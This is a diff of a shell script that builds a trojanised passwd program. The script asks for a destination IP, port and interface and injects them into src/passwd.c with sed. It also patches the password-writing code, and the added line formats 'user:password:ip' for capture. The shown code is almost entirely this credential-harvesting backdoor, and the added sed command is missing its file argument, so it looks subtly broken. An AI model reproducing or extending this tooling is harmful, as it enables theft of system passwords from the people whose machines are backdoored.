@@ -13,7 +13,7 @@ echo -n "Set the destination port : "
 read port
 echo -n "Enter Interface name : "
 read interface
-echo -ne "IP : ${ip}\n Port : ${port}\n Interface : ${interface}\nConfirm these settings [y/n] : "
+echo -ne " IP : ${ip}\n Port : ${port}\n Interface : ${interface}\nConfirm these settings [y/n] : "
 read pass
 if [[ $pass == n ]]; then
     exit 0
@@ -60,6 +60,9 @@ sed -i 's/#INT/'"$interface"'/g' src/passwd.c
 sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
 sed -i 's/\", name, password);/ /g' src/passwd.c
 sed -i 's/fprintf(fptr, \"%s:%s/fprintf(fptr, \"%s:%s\\n\", name, password);/g' src/passwd.c
+
+# add snprint
+sed -i 's/\/\/SNPRINT/int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", user, password, ip);/g'
 
 
 ## Make ##
